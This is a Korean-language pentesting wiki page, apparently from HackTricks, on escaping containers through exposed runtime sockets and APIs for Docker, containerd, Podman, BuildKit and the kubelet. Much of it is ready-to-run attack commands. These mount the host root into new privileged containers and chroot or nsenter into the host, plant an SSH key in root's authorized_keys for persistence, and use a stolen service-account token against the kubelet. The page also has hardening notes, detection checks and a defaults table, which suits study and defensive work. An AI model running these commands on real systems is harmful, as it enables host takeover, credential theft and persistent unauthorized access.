# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

많은 실제 container 침해는 namespace escape에서 전혀 시작되지 않습니다. 대신 runtime control plane에 대한 access에서 시작됩니다. workload가 mounted Unix socket 또는 exposed TCP listener를 통해 `dockerd`, `containerd`, CRI-O, Podman, kubelet과 통신할 수 있다면, attacker는 더 높은 privileges를 가진 새 container를 요청하거나, host filesystem을 mount하거나, host namespaces에 join하거나, 민감한 node 정보를 retrieve할 수 있습니다. 이러한 경우 runtime API가 실제 security boundary이며, 이를 compromise하는 것은 기능적으로 host를 compromise하는 것과 가깝습니다.

이 때문에 runtime socket exposure는 kernel protections와 별도로 문서화해야 합니다. 일반적인 seccomp, capabilities, MAC confinement이 적용된 container라도 `/var/run/docker.sock` 또는 `/run/containerd/containerd.sock`이 내부에 mount되어 있다면 API call 한 번으로 host compromise가 가능할 수 있습니다. 현재 container의 kernel isolation은 정확히 의도된 대로 작동하고 있을 수 있지만, runtime management plane은 완전히 노출된 상태로 남아 있습니다.

## Daemon Access Models

Docker Engine은 전통적으로 `unix:///var/run/docker.sock`의 local Unix socket을 통해 privileged API를 노출합니다. 과거에는 `tcp://0.0.0.0:2375`와 같은 TCP listener 또는 2376의 TLS-protected listener를 통해 원격으로도 노출되었습니다. 강력한 TLS와 client authentication 없이 daemon을 원격으로 노출하면 사실상 Docker API가 remote root interface로 바뀝니다.

containerd, CRI-O, Podman, kubelet도 유사한 high-impact surface를 노출합니다. 이름과 workflow는 다르지만 logic은 동일합니다. interface가 caller에게 workload를 생성하거나, host paths를 mount하거나, credentials를 retrieve하거나, 실행 중인 container를 변경하도록 허용한다면, 해당 interface는 privileged management channel이며 그에 맞게 취급해야 합니다.

확인할 가치가 있는 일반적인 local paths는 다음과 같습니다:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
오래되었거나 보다 특수한 스택에서는 `dockershim.sock`, `frakti.sock`, `rktlet.sock`과 같은 endpoint도 노출될 수 있습니다. 이러한 endpoint는 최신 환경에서는 덜 일반적이지만, 발견되는 경우 일반 애플리케이션 소켓이 아니라 runtime-control surface를 나타내므로 동일한 주의가 필요합니다.

## Secure Remote Access

daemon을 로컬 소켓 외부에 노출해야 한다면 연결을 TLS로 보호해야 하며, daemon이 client를 검증하고 client가 daemon을 검증할 수 있도록 mutual authentication을 사용하는 것이 좋습니다. 편의를 위해 Docker daemon을 평문 HTTP로 열어 두던 오래된 관행은 container 관리에서 가장 위험한 실수 중 하나입니다. API surface만으로도 privileged container를 직접 생성할 수 있을 만큼 강력하기 때문입니다.

과거의 Docker 설정 패턴은 다음과 같았습니다:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd 기반 host에서는 daemon 통신이 `fd://`로 표시되기도 합니다. 이는 프로세스가 직접 소켓을 bind하는 대신 systemd에서 미리 열어 둔 소켓을 상속한다는 의미입니다. 중요한 점은 정확한 syntax가 아니라 security consequence입니다. daemon이 엄격한 permission이 설정된 local socket을 넘어선 위치에서 listen하는 순간, transport security와 client authentication은 선택적인 hardening이 아니라 필수가 됩니다.

## Abuse

runtime socket이 존재한다면 어떤 socket인지, 호환 가능한 client가 존재하는지, 그리고 raw HTTP 또는 gRPC access가 가능한지 확인합니다:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
이 명령어들은 경로가 끊겼는지, socket이 마운트되었지만 접근할 수 없는지, 또는 활성화된 privileged API인지 구분하는 데 유용합니다. client가 성공하면 다음으로 확인할 사항은 해당 API가 host bind mount 또는 host namespace sharing을 사용해 새 container를 실행할 수 있는지 여부입니다.

### Client가 설치되어 있지 않은 경우

`docker`, `podman` 또는 다른 친숙한 CLI가 없다고 해서 socket이 안전하다는 의미는 아닙니다. Docker Engine은 Unix socket을 통해 HTTP를 사용하며, Podman은 `podman system service`를 통해 Docker-compatible API와 Libpod-native API를 모두 노출합니다. 따라서 `curl`만 있는 minimal environment에서도 daemon을 제어할 수 있습니다:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
이는 post-exploitation 중 중요합니다. 방어 담당자가 일반적인 client binary를 제거하면서도 management socket은 mount된 상태로 남겨 두는 경우가 있기 때문입니다. Podman host에서는 rootful 및 rootless deployment에 따라 중요한 path가 다르다는 점을 기억해야 합니다. rootful service instance에는 `unix:///run/podman/podman.sock`, rootless instance에는 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`이 사용됩니다.

### 전체 예시: Docker Socket To Host Root

`docker.sock`에 접근할 수 있다면, 일반적인 escape 방법은 host root filesystem을 mount한 새 container를 시작한 다음 그 안에서 `chroot`하는 것입니다:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
이는 Docker daemon을 통해 host-root 권한으로 직접 실행할 수 있게 합니다. 영향은 단순한 파일 읽기에 국한되지 않습니다. 새로운 container 내부에 들어간 공격자는 host 파일을 변경하거나, credentials를 수집하거나, persistence를 심거나, 추가 privileged workload를 시작할 수 있습니다.

### Full Example: Docker Socket To Host Namespaces

공격자가 filesystem-only access 대신 namespace entry를 선호하는 경우:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
이 경로는 현재 container를 exploit하는 대신, runtime에 명시적으로 host namespace exposure를 적용한 새 container를 생성하도록 요청하여 host에 도달합니다.

### Docker Socket Persistence Pattern

Runtime control은 일회성 one-shot shell 대신 persistence에도 사용할 수 있습니다. 일반적인 pattern은 host mount가 있는 helper container를 생성하고, mount된 host filesystem에 authorized access material 또는 startup hook을 기록한 다음, host가 이를 사용하는지 검증하는 것입니다.

예시 형태:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
동일한 아이디어를 systemd units, cron fragments, application startup files 또는 SSH keys에 적용할 수 있으며, 이는 operator가 입증하려는 내용에 따라 달라집니다. 중요한 점은 persistent change가 원래 container의 추가 privilege를 통해서가 아니라 runtime daemon의 host-level filesystem authority를 통해 이루어진다는 것입니다.

### Raw Docker API Helper Pivot

Docker CLI가 없는 경우에도 Unix socket을 통한 HTTP를 사용해 동일한 host-mount helper flow를 수행할 수 있습니다. 일반적인 flow는 API를 확인하고, host bind mount가 설정된 helper container를 생성한 다음, 이를 start하고, exec instance를 생성한 뒤, 해당 exec를 start하는 것입니다.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
최종 `/exec/<id>/start` 요청은 반환된 exec ID에 의존하지만, 보안상의 핵심은 정확한 JSON 처리 방식과 무관합니다. rootful Docker daemon에 대한 raw API access만으로도 더 강력한 helper workload를 요청할 수 있습니다.

### Full Example: containerd Socket

마운트된 `containerd` socket도 일반적으로 그만큼 위험합니다:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
더 Docker에 가까운 client가 있다면 `--privileged`, `--pid=host`, `-v`와 같은 익숙한 flags를 제공하므로 `nerdctl`이 `ctr`보다 더 편리할 수 있습니다:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
영향은 다시 host compromise입니다. Docker-specific tooling이 없어도 다른 runtime API가 동일한 administrative power를 제공할 수 있습니다. Kubernetes nodes에서는 `crictl`이 CRI endpoint와 직접 통신하므로 reconnaissance와 container interaction에 충분할 수 있습니다.

### BuildKit Socket

사람들은 흔히 `buildkitd`를 "단순한 build backend"로 생각하기 때문에 놓치기 쉽지만, daemon은 여전히 privileged control plane입니다. 접근 가능한 `buildkitd.sock`을 통해 attacker는 arbitrary build steps를 실행하고, worker capabilities를 확인하며, compromised environment의 local contexts를 사용하고, daemon이 이를 허용하도록 구성된 경우 `network.host` 또는 `security.insecure`와 같은 dangerous entitlements를 요청할 수 있습니다.

유용한 첫 interaction은 다음과 같습니다:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon이 build requests를 수락한다면, insecure entitlements를 사용할 수 있는지 테스트합니다:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
정확한 영향은 daemon 설정에 따라 달라지지만, permissive entitlements가 적용된 rootful BuildKit service는 단순히 무해한 developer 편의 기능이 아닙니다. 특히 CI runners와 shared build nodes에서는 이를 또 하나의 high-value administrative surface로 간주해야 합니다.

### Kubelet API Over TCP

kubelet은 container runtime은 아니지만, 여전히 node management plane의 일부이며 동일한 trust boundary 논의에 자주 포함됩니다. workload에서 kubelet secure port `10250`에 접근할 수 있거나 node credentials, kubeconfigs 또는 proxy rights가 노출된 경우, attacker는 Kubernetes API server admission path를 전혀 거치지 않고도 Pods를 열거하거나 logs를 가져오거나 node-local containers에서 commands를 실행할 수 있습니다.

먼저 비용이 적은 discovery부터 시작합니다:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet 또는 API-server proxy 경로에서 `exec`를 허가하면, WebSocket을 지원하는 client가 이를 이용해 해당 node의 다른 container에서 code execution을 수행할 수 있습니다. 이것이 `get` 권한만 있는 `nodes/proxy`도 알려진 것보다 더 위험한 이유이기도 합니다. 요청이 여전히 command를 실행하는 kubelet endpoint에 도달할 수 있으며, 이러한 직접적인 kubelet 상호작용은 일반적인 Kubernetes audit log에 표시되지 않습니다.

## Checks

이러한 checks의 목표는 container가 trust boundary 외부에 있어야 했던 management plane에 접근할 수 있는지 확인하는 것입니다.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
여기서 중요한 점:

- Mount된 runtime socket은 단순한 정보 disclosure가 아니라, 일반적으로 직접적인 administrative primitive입니다.
- TLS가 없는 `2375` TCP listener는 remote-compromise condition으로 간주해야 합니다.
- `DOCKER_HOST` 같은 environment variable은 workload가 의도적으로 host runtime과 통신하도록 설계되었음을 드러내는 경우가 많습니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 Local Unix socket | `dockerd`는 local socket에서 listen하며 daemon은 대개 rootful로 실행됨 | `/var/run/docker.sock` mount, `tcp://...:2375` expose, `2376`에서 TLS가 약하거나 없음 |
| Podman | 기본적으로 Daemonless CLI | 일반적인 local 사용에는 장시간 실행되는 privileged daemon이 필요하지 않음; `podman system service`가 활성화되면 API socket이 expose될 수 있음 | `podman.sock` expose, service를 광범위하게 실행, rootful API 사용 |
| containerd | Local privileged socket | Administrative API가 local socket을 통해 expose되며 대개 higher-level tooling이 사용함 | `containerd.sock` mount, 광범위한 `ctr` 또는 `nerdctl` access, privileged namespace expose |
| CRI-O | Local privileged socket | CRI endpoint는 node-local trusted component를 위한 것임 | `crio.sock` mount, CRI endpoint를 untrusted workload에 expose |
| Kubernetes kubelet | Node-local management API | Kubelet은 Pod에서 광범위하게 reachable해서는 안 됨; authn/authz 설정에 따라 access 시 pod state, credential 및 execution feature가 노출될 수 있음 | kubelet socket 또는 cert mount, weak kubelet auth, host networking과 reachable kubelet endpoint 조합 |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
